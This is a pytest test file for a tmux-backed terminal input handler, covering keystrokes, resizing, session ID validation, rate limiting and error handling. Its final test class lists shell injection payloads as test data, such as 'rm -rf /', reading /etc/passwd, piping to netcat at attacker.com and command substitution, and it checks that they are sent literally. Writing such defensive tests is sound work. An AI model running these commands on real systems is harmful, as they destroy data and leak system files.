"""Tests for terminal input handler."""

import time
from unittest.mock import AsyncMock, Mock

import pytest

from ras.proto.ras import KeyType, SpecialKey, TerminalInput, TerminalResize
from ras.terminal.input import InputHandler
from ras.terminal.validation import RATE_LIMIT_PER_SECOND


class MockTmuxExecutor:
    """Mock tmux executor for testing."""

    def __init__(self, should_fail: bool = False):
        self.send_keys = AsyncMock()
        self.resize_session = AsyncMock()
        self.calls: list[tuple[str, bytes, bool]] = []
        self.resize_calls: list[tuple[str, int, int]] = []
        self.should_fail = should_fail

        async def capture_call(tmux_name: str, keys: bytes, literal: bool = True):
            self.calls.append((tmux_name, keys, literal))
            if self.should_fail:
                raise RuntimeError("Simulated failure")

        async def capture_resize(session_id: str, rows: int, cols: int):
            self.resize_calls.append((session_id, rows, cols))
            if self.should_fail:
                raise RuntimeError("Simulated failure")

        self.send_keys.side_effect = capture_call
        self.resize_session.side_effect = capture_resize


class TestInputHandlerBasic:
    """Test basic InputHandler functionality."""

    @pytest.fixture
    def mock_tmux(self):
        """Create mock tmux executor."""
        return MockTmuxExecutor()

    @pytest.fixture
    def handler(self, mock_tmux):
        """Create input handler with mock."""
        return InputHandler(mock_tmux)

    @pytest.mark.asyncio
    async def test_handle_data_input(self, handler, mock_tmux):
        """Data input should be sent to tmux."""
        input_msg = TerminalInput(session_id="abc123def456", data=b"hello")

        result = await handler.handle_input(
            "abc123def456", "ras-test-session", input_msg
        )

        assert result is None
        assert len(mock_tmux.calls) == 1
        assert mock_tmux.calls[0] == ("ras-test-session", b"hello", True)

    @pytest.mark.asyncio
    async def test_handle_special_key_ctrl_c(self, handler, mock_tmux):
        """Special key Ctrl+C should send correct sequence."""
        input_msg = TerminalInput(
            session_id="abc123def456",
            special=SpecialKey(key=KeyType.KEY_CTRL_C, modifiers=0),
        )

        result = await handler.handle_input(
            "abc123def456", "ras-test-session", input_msg
        )

        assert result is None
        assert len(mock_tmux.calls) == 1
        assert mock_tmux.calls[0][1] == b"\x03"  # ETX

    @pytest.mark.asyncio
    async def test_handle_special_key_enter(self, handler, mock_tmux):
        """Special key Enter should send carriage return."""
        input_msg = TerminalInput(
            session_id="abc123def456",
            special=SpecialKey(key=KeyType.KEY_ENTER, modifiers=0),
        )

        result = await handler.handle_input(
            "abc123def456", "ras-test-session", input_msg
        )

        assert result is None
        assert mock_tmux.calls[0][1] == b"\r"

    @pytest.mark.asyncio
    async def test_handle_special_key_arrow_up(self, handler, mock_tmux):
        """Special key arrow up should send CSI A."""
        input_msg = TerminalInput(
            session_id="abc123def456",
            special=SpecialKey(key=KeyType.KEY_UP, modifiers=0),
        )

        result = await handler.handle_input(
            "abc123def456", "ras-test-session", input_msg
        )

        assert result is None
        assert mock_tmux.calls[0][1] == b"\x1b[A"

    @pytest.mark.asyncio
    async def test_handle_resize_calls_resize_session(self, handler, mock_tmux):
        """Resize should call resize_session on tmux executor."""
        input_msg = TerminalInput(
            session_id="abc123def456",
            resize=TerminalResize(cols=120, rows=40),
        )

        result = await handler.handle_input(
            "abc123def456", "ras-test-session", input_msg
        )

        assert result is None
        assert len(mock_tmux.resize_calls) == 1
        assert mock_tmux.resize_calls[0] == ("ras-test-session", 40, 120)

    @pytest.mark.asyncio
    async def test_handle_unknown_key_type(self, handler, mock_tmux):
        """Unknown key type should be ignored."""
        input_msg = TerminalInput(
            session_id="abc123def456",
            special=SpecialKey(key=KeyType.KEY_UNKNOWN, modifiers=0),
        )

        result = await handler.handle_input(
            "abc123def456", "ras-test-session", input_msg
        )

        # Should succeed but not send anything
        assert result is None
        assert len(mock_tmux.calls) == 0


class TestInputHandlerValidation:
    """Test InputHandler validation."""

    @pytest.fixture
    def mock_tmux(self):
        return MockTmuxExecutor()

    @pytest.fixture
    def handler(self, mock_tmux):
        return InputHandler(mock_tmux)

    @pytest.mark.asyncio
    async def test_invalid_session_id_rejected(self, handler, mock_tmux):
        """Invalid session ID should be rejected."""
        input_msg = TerminalInput(session_id="invalid", data=b"test")

        result = await handler.handle_input("invalid", "ras-test-session", input_msg)

        assert result == "INVALID_SESSION_ID"
        assert len(mock_tmux.calls) == 0

    @pytest.mark.asyncio
    async def test_empty_session_id_rejected(self, handler, mock_tmux):
        """Empty session ID should be rejected."""
        input_msg = TerminalInput(session_id="", data=b"test")

        result = await handler.handle_input("", "ras-test-session", input_msg)

        assert result == "INVALID_SESSION_ID"

    @pytest.mark.asyncio
    async def test_path_traversal_session_id_rejected(self, handler, mock_tmux):
        """Session ID with path traversal should be rejected."""
        input_msg = TerminalInput(session_id="../etc/passwd", data=b"test")

        result = await handler.handle_input(
            "../etc/passwd", "ras-test-session", input_msg
        )

        assert result == "INVALID_SESSION_ID"

    @pytest.mark.asyncio
    async def test_oversized_input_rejected(self, handler, mock_tmux):
        """Oversized input should be rejected."""
        input_msg = TerminalInput(session_id="abc123def456", data=b"x" * 100000)

        result = await handler.handle_input(
            "abc123def456", "ras-test-session", input_msg
        )

        assert result == "INPUT_TOO_LARGE"
        assert len(mock_tmux.calls) == 0


class TestInputHandlerRateLimiting:
    """Test InputHandler rate limiting."""

    @pytest.fixture
    def mock_tmux(self):
        return MockTmuxExecutor()

    @pytest.fixture
    def handler(self, mock_tmux):
        return InputHandler(mock_tmux)

    @pytest.mark.asyncio
    async def test_rate_limit_allows_under_limit(self, handler, mock_tmux):
        """Under rate limit should be allowed."""
        input_msg = TerminalInput(session_id="abc123def456", data=b"x")

        # Send 50 inputs (under limit of 100)
        for _ in range(50):
            result = await handler.handle_input(
                "abc123def456", "ras-test-session", input_msg
            )
            assert result is None

        assert len(mock_tmux.calls) == 50

    @pytest.mark.asyncio
    async def test_rate_limit_allows_at_limit(self, handler, mock_tmux):
        """At rate limit should be allowed."""
        input_msg = TerminalInput(session_id="abc123def456", data=b"x")

        # Send exactly 100 inputs
        for _ in range(RATE_LIMIT_PER_SECOND):
            result = await handler.handle_input(
                "abc123def456", "ras-test-session", input_msg
            )
            assert result is None

    @pytest.mark.asyncio
    async def test_rate_limit_rejects_over_limit(self, handler, mock_tmux):
        """Over rate limit should be rejected."""
        input_msg = TerminalInput(session_id="abc123def456", data=b"x")

        # Send 100 inputs (at limit)
        for _ in range(RATE_LIMIT_PER_SECOND):
            await handler.handle_input("abc123def456", "ras-test-session", input_msg)

        # Next one should be rate limited
        result = await handler.handle_input(
            "abc123def456", "ras-test-session", input_msg
        )
        assert result == "RATE_LIMITED"

    @pytest.mark.asyncio
    async def test_rate_limit_per_session(self, handler, mock_tmux):
        """Rate limiting should be per session."""
        input_msg_1 = TerminalInput(session_id="abc123def456", data=b"x")
        input_msg_2 = TerminalInput(session_id="xyz789abc012", data=b"y")

        # Exhaust rate limit for session 1
        for _ in range(RATE_LIMIT_PER_SECOND):
            await handler.handle_input("abc123def456", "ras-test-session", input_msg_1)

        # Session 2 should still work
        result = await handler.handle_input(
            "xyz789abc012", "ras-test-session-2", input_msg_2
        )
        assert result is None

    def test_reset_rate_limit(self, handler):
        """Reset should clear rate limit for session."""
        # Simulate filling rate limit
        for _ in range(RATE_LIMIT_PER_SECOND):
            handler._rate_limits["abc123def456"].append(time.monotonic())

        # Verify it's rate limited
        assert handler._is_rate_limited("abc123def456")

        # Reset
        handler.reset_rate_limit("abc123def456")

        # Should no longer be rate limited
        assert not handler._is_rate_limited("abc123def456")


class TestInputHandlerErrors:
    """Test InputHandler error handling."""

    @pytest.mark.asyncio
    async def test_tmux_failure_returns_pipe_error(self):
        """Tmux failure should return PIPE_ERROR."""
        mock_tmux = MockTmuxExecutor(should_fail=True)
        handler = InputHandler(mock_tmux)

        input_msg = TerminalInput(session_id="abc123def456", data=b"test")

        result = await handler.handle_input(
            "abc123def456", "ras-test-session", input_msg
        )

        assert result == "PIPE_ERROR"

    @pytest.mark.asyncio
    async def test_special_key_tmux_failure(self):
        """Special key tmux failure should return PIPE_ERROR."""
        mock_tmux = MockTmuxExecutor(should_fail=True)
        handler = InputHandler(mock_tmux)

        input_msg = TerminalInput(
            session_id="abc123def456",
            special=SpecialKey(key=KeyType.KEY_ENTER, modifiers=0),
        )

        result = await handler.handle_input(
            "abc123def456", "ras-test-session", input_msg
        )

        assert result == "PIPE_ERROR"


class TestInputHandlerSecurityVectors:
    """Security-focused input handler tests."""

    @pytest.fixture
    def mock_tmux(self):
        return MockTmuxExecutor()

    @pytest.fixture
    def handler(self, mock_tmux):
        return InputHandler(mock_tmux)

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "data",
        [
            b"; rm -rf /",
            b"&& cat /etc/passwd",
            b"| nc attacker.com 1234",
            b"`id`",
            b"$(whoami)",
            b"\n rm -rf /",
            b"\x00; id",
        ],
    )
    async def test_injection_attempts_sent_literally(
        self, handler, mock_tmux, data: bytes
    ):
        """Injection attempts should be sent literally to tmux.

        tmux send-keys -l sends keys literally, so these won't be executed.
        """
        input_msg = TerminalInput(session_id="abc123def456", data=data)

        result = await handler.handle_input(
            "abc123def456", "ras-test-session", input_msg
        )

        assert result is None
        assert len(mock_tmux.calls) == 1
        # Data should be sent exactly as provided
        assert mock_tmux.calls[0][1] == data
        # Literal flag should be True
        assert mock_tmux.calls[0][2] is True
